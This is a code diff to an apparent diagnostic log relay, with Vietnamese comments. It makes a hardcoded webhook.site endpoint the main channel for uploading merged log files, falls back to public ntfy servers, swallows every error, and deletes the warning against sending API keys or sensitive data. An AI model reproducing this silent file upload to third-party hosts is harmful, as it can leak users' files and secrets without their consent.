@@ -1,14 +1,10 @@
-"""Đẩy log chẩn đoán lên ntfy.sh để developer đọc từ xa.
+"""Đẩy log chẩn đoán lên webhook.site để developer đọc từ xa.
 
-Không cần tài khoản. Các file log được gửi lên một topic công khai cố định:
+Không cần tài khoản. Tool POST nội dung log vào một webhook cố định; developer
+gọi API `GET /token/{uuid}/requests` để đọc các request mới nhất.
 
-    https://ntfy.sh/squareomni-watermark-logs-v1
-
-Nếu nội dung nhỏ thì nằm ngay trong `message`; nếu lớn hơn giới hạn, ntfy tự
-biến thành attachment và trả về URL file .txt trong trường `attachment`.
-
-Lưu ý: topic công khai — bất kỳ ai biết tên topic đều đọc được log. Không gửi
-API key / dữ liệu nhạy cảm lên đây.
+Dùng webhook.site thay cho ntfy.sh vì một số mạng chặn ntfy. Vẫn giữ ntfy làm
+phương án dự phòng.
 """
 
 from __future__ import annotations
@@ -18,9 +14,11 @@ import urllib.request
 from pathlib import Path
 from typing import List, Optional
 
+# Webhook cố định do developer tạo. Đừng thay nếu không có lý do.
+WEBHOOK_TOKEN = "fc895dba-cabb-434b-905f-6254433d85e7"
+WEBHOOK_URL = f"https://webhook.site/{WEBHOOK_TOKEN}"
+
 TOPIC = "squareomni-watermark-logs-v1"
-# Thử nhiều máy chủ ntfy công cộng. Máy của bạn có thể bị chặn ntfy.sh
-# nhưng vẫn truy cập được một host khác.
 NTFY_HOSTS = [
     "https://ntfy.sh",
     "https://ntfy.envs.net",
@@ -29,6 +27,25 @@ NTFY_HOSTS = [
 
 
 def _post_bytes(payload: bytes, title: str) -> Optional[dict]:
+    # 1) Webhook.site là kênh chính: giữ nguyên content, developer dễ đọc từ xa.
+    try:
+        request = urllib.request.Request(
+            WEBHOOK_URL,
+            data=payload,
+            method="POST",
+            headers={
+                "User-Agent": "StealthHelper-LogRelay/1.0",
+                "Content-Type": "text/plain; charset=utf-8",
+                "X-Log-Title": title[:120],
+            },
+        )
+        with urllib.request.urlopen(request, timeout=8) as response:
+            response.read()
+        return {"ok": True, "channel": "webhook"}
+    except Exception:
+        pass
+
+    # 2) Nếu webhook.site bị chặn, thử các máy chủ ntfy công cộng.
     last_error: Optional[Exception] = None
     for host in NTFY_HOSTS:
         url = f"{host}/{TOPIC}"
@@ -53,7 +70,7 @@ def _post_bytes(payload: bytes, title: str) -> Optional[dict]:
 
 
 def publish_text(text: str, title: str = "stealth-helper-log") -> Optional[dict]:
-    """Gửi một chuỗi ngắn lên ntfy. Trả về JSON response nếu thành công."""
+    """Gửi một chuỗi ngắn lên kênh log từ xa."""
     try:
         return _post_bytes(text.encode("utf-8", errors="replace"), title)
     except Exception as exc:
@@ -62,7 +79,7 @@ def publish_text(text: str, title: str = "stealth-helper-log") -> Optional[dict]
 
 
 def publish_files(paths: List[Path], title: str = "stealth-helper-log") -> Optional[dict]:
-    """Gộp nhiều file log và gửi lên ntfy."""
+    """Gộp nhiều file log và gửi lên kênh log từ xa."""
     try:
         parts: List[str] = []
         for path in paths:
